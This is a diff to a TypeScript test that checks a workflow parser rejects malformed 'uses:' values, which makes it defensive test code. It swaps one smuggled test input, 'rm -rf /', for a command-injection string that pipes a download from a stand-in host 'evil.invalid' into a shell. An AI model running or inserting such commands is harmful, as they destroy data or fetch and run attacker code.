@@ -246,7 +246,7 @@ test("the allowed actions come from parsed `uses:` keys only: text in a run bloc
   for (const [text, form] of [
     ["steps:\n  - { uses: evil/flow@main }", "a flow mapping"],
     ["steps:\n  - uses: *anchor", "an alias"],
-    ["steps:\n  - uses: \"evil/x@main; rm -rf /\"", "a value that is not a reference"],
+    ["steps:\n  - uses: \"evil/x@main; curl https://evil.invalid | sh\"", "a value that is not a reference"],
   ] as const) {
     assert.throws(() => workflowUsesOf(text, "w.yml"), (error: unknown) => isForgeError(error, "forge_declaration_invalid"), form);
   }
